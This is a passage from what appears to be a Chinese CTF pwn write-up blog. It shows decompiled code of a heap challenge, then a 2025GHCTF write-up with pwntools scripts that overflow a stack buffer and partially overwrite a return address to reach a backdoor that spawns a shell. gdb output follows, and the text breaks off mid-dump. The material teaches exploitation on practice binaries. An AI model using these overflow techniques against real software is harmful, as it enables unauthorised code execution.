class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  signal(<span class="hljs-number">14</span>, (<span class="hljs-type">__sighandler_t</span>)handler);<br>  LODWORD(v0) = alarm(<span class="hljs-number">0x3Cu</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br>  &#123;<br>    qword_2020F8[<span class="hljs-number">4</span> * i] = <span class="hljs-number">0LL</span>;<br>    *((_BYTE *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * i) = <span class="hljs-number">0</span>;<br>    v0 = &amp;unk_2020EB;<br>    *((_BYTE *)&amp;unk_2020EB + <span class="hljs-number">32</span> * i) = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_C32()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_C32</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------PhoneRecord-----------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------1.Add Record----------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------2.Delete Record-------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------3.Show Record---------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------4.Edit Record---------&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your choice&gt;&gt;&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xAu</span>LL);<br>  <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_1003()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1003</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">3</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bad index!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)qword_2020F8[<span class="hljs-number">4</span> * (<span class="hljs-type">int</span>)v1]);<br>    *((_BYTE *)&amp;unk_2020EB + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1) = <span class="hljs-number">0</span>;<br>    *((_BYTE *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1) = <span class="hljs-number">0</span>;<br>    dword_2020C0[v1] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;delete sucess!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_10EB()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_10EB</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> &amp;&amp; *((_BYTE *)&amp;unk_2020EB + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nname:%s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1 + <span class="hljs-number">11</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;des:%s\n&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;qword_2020F8 + <span class="hljs-number">4</span> * (<span class="hljs-type">int</span>)v1));<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bad index!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_CCE()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_CCE</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">3</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bad index!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phone number:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * (<span class="hljs-type">int</span>)v1 + <span class="hljs-number">11</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;des info:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)qword_2020F8[<span class="hljs-number">4</span> * (<span class="hljs-type">int</span>)v1], (<span class="hljs-type">int</span>)dword_2020C0[v1]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_E13()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_E13</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  _BYTE *v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phone number:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * dword_2020BC);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)&amp;unk_2020E0 + <span class="hljs-number">32</span> * dword_2020BC + <span class="hljs-number">11</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_2020BC &gt; <span class="hljs-number">3</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input des size:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0x80</span> )<br>    &#123;<br>      dword_2020C0[dword_2020BC] = v1;<br>      v3 = <span class="hljs-built_in">malloc</span>((<span class="hljs-type">int</span>)v1);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;des info:&quot;</span>);<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= (<span class="hljs-type">int</span>)v1; ++i )<br>      &#123;<br>        read(<span class="hljs-number">0</span>, &amp;v3[i], <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( v3[i] == <span class="hljs-number">10</span> )<br>        &#123;<br>          v3[i] = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">break</span>;<br>        &#125;<br>      &#125;<br>      qword_2020F8[<span class="hljs-number">4</span> * dword_2020BC++] = v3;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025GHCTF</title>
    <link href="/2025GHCTF_WP/"/>
    <url>/2025GHCTF_WP/</url>
    
    <content type="html"><![CDATA[<h1 id="2025GHCTF-WP"><a href="#2025GHCTF-WP" class="headerlink" title="2025GHCTF_WP"></a>2025GHCTF_WP</h1><h2 id="Welcome-come-to-the-world-of-PWN"><a href="#Welcome-come-to-the-world-of-PWN" class="headerlink" title="Welcome come to the world of PWN"></a>Welcome come to the world of PWN</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>ida_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  out();<br>  func1();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ida_out:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">out</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*****   *   *  *****  ******   ***** &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*       *   *  *        *      *     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;* ****  *****  *        *      ***** &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*   *   *   *  *        *      *     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*****   *   *  *****    *      *     &quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello pwner!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ida_fun1:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">func1</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40u</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>ida_backdoor:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/pwn1$ checksec attachment<br>[*] &#x27;/mnt/d/111/pwn1/attachment&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>gdb_funciton:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ info function<br>All defined functions:<br><br>Non-debugging symbols:<br>0x0000000000000728  _init<br>0x0000000000000760  puts@plt<br>0x0000000000000770  system@plt<br>0x0000000000000780  read@plt<br>0x0000000000000790  __libc_start_main@plt<br>0x00000000000007a0  setvbuf@plt<br>0x00000000000007b0  __gmon_start__@plt<br>0x00000000000007b8  __cxa_finalize@plt<br>0x00000000000007c0  _start<br>0x00000000000007f0  deregister_tm_clones<br>0x0000000000000830  register_tm_clones<br>0x0000000000000880  __do_global_dtors_aux<br>0x00000000000008c0  frame_dummy<br>0x00000000000008f0  func1<br>0x0000000000000911  init<br>0x0000000000000972  out<br>0x00000000000009c1  backdoor<br>0x00000000000009d4  main<br>0x0000000000000a00  __libc_csu_init<br>0x0000000000000a70  __libc_csu_fini<br>0x0000000000000a74  _fini<br></code></pre></td></tr></table></figure><p>我的基本思路是覆盖ret_addr的低四位，有一个16进制位不确定，随后就尝试爆破</p><p>这是我最初的题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>backdoor_addr = b&#x27;\xc1&#x27; + b&#x27;\x09&#x27;<br><br>payload1 = b&#x27;a&#x27;* ( 0x20 + 0x8 ) + backdoor_addr<br><br>count = 1<br>while True:<br>    p = process(&quot;./attachment&quot;)<br>    try:<br>        count += 1<br>        print(count,end=&#x27; &#x27;)<br>        p.recvuntil(b&quot;Hello pwner!\n&quot;)<br>        p.send(payload1)<br>        recv = p.recv(timeout=10)<br>    except:<br>        print(&quot;error&quot;,end=&#x27; &#x27;)<br>    else:<br>        p.interactive()<br>        break<br></code></pre></td></tr></table></figure><p>但是尝试后不行</p><p>随后观察到这个main函数的地址和back_door的地址其实只有最后两个十六进制位不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000000009c1  backdoor<br>0x00000000000009d4  main<br></code></pre></td></tr></table></figure><p>所以只需要覆盖低两位，并且就不用再爆破了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>p = process(&#x27;./attachment&#x27;)<br><br>backdoor_addr = b&#x27;\xc1&#x27;<br>payload1 = b&#x27;a&#x27;*( 0x20+0x8 ) + backdoor_addr<br><br>p.send(payload1)<br>sleep(0.5)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>随后发现还是不行</p><p>再次用gdb调试</p><p>我不太熟悉动调，目前只会加pause()</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>p = process(&#x27;./attachment&#x27;)<br><br>backdoor_addr = b&#x27;\xc9&#x27;<br><br>payload1 = b&#x27;a&#x27;* ( 0x20 + 0x8 ) + backdoor_addr<br><br>pause()<br>p.send(payload1)<br>sleep(0.5)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>gdb attach接管后的情况</p><p>未送入payload1前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[----------------------------------registers-----------------------------------]<br>RAX: 0xfffffffffffffe00<br>RBX: 0x7ffc20be2648 --&gt; 0x7ffc20be41b3 (&quot;./attachment&quot;)<br>RCX: 0x7f495329ca61 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)<br>RDX: 0x40 (&#x27;@&#x27;)<br>RSI: 0x7ffc20be24f0 --&gt; 0x0<br>RDI: 0x0<br>RBP: 0x7ffc20be2510 --&gt; 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>RSP: 0x7ffc20be24e8 --&gt; 0x56531f60090e (&lt;func1+30&gt;:     nop)<br>RIP: 0x7f495329ca61 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)<br>R8 : 0xc (&#x27;\x0c&#x27;)<br>R9 : 0x7f49533a0380 (&lt;_dl_fini&gt;:        endbr64)<br>R10: 0x7f49531919d8 --&gt; 0x11001200001bd3<br>R11: 0x246<br>R12: 0x1<br>R13: 0x0<br>R14: 0x0<br>R15: 0x7f49533d3000 --&gt; 0x7f49533d42e0 --&gt; 0x56531f600000 --&gt; 0x10102464c457f<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7f495329ca5b &lt;__GI___libc_read+11&gt;:        je     0x7f495329ca70 &lt;__GI___libc_read+32&gt;<br>   0x7f495329ca5d &lt;__GI___libc_read+13&gt;:        xor    eax,eax<br>   0x7f495329ca5f &lt;__GI___libc_read+15&gt;:        syscall<br>=&gt; 0x7f495329ca61 &lt;__GI___libc_read+17&gt;:        cmp    rax,0xfffffffffffff000<br>   0x7f495329ca67 &lt;__GI___libc_read+23&gt;:        ja     0x7f495329cab8 &lt;__GI___libc_read+104&gt;<br>   0x7f495329ca69 &lt;__GI___libc_read+25&gt;:        ret<br>   0x7f495329ca6a &lt;__GI___libc_read+26&gt;:        nop    WORD PTR [rax+rax*1+0x0]<br>   0x7f495329ca70 &lt;__GI___libc_read+32&gt;:        push   rbp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7ffc20be24e8 --&gt; 0x56531f60090e (&lt;func1+30&gt;:    nop)<br>0008| 0x7ffc20be24f0 --&gt; 0x0<br>0016| 0x7ffc20be24f8 --&gt; 0x7f49533d3000 --&gt; 0x7f49533d42e0 --&gt; 0x56531f600000 --&gt; 0x10102464c457f<br>0024| 0x7ffc20be2500 --&gt; 0x7ffc20be2510 --&gt; 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>0032| 0x7ffc20be2508 --&gt; 0x56531f6009be (&lt;out+76&gt;:      nop)<br>0040| 0x7ffc20be2510 --&gt; 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>0048| 0x7ffc20be2518 --&gt; 0x56531f6009f6 (&lt;main+34&gt;:     mov    eax,0x0)<br>0056| 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007f495329ca61 in __GI___libc_read (fd=0x0, buf=0x7ffc20be24f0, nbytes=0x40) at ../sysdeps/unix/sysv/linux/read.c:26<br>warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x7ffc20be2648 —▸ 0x7ffc20be41b3 ◂— &#x27;./attachment&#x27;<br> RCX  0x7f495329ca61 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */<br> RDX  0x40<br> RDI  0<br> RSI  0x7ffc20be24f0 ◂— 0<br> R8   0xc<br> R9   0x7f49533a0380 (_dl_fini) ◂— endbr64<br> R10  0x7f49531919d8 ◂— 0x11001200001bd3<br> R11  0x246<br> R12  1<br> R13  0<br> R14  0<br> R15  0x7f49533d3000 (_rtld_global) —▸ 0x7f49533d42e0 —▸ 0x56531f600000 ◂— jg 0x56531f600047<br> RBP  0x7ffc20be2510 —▸ 0x7ffc20be2520 —▸ 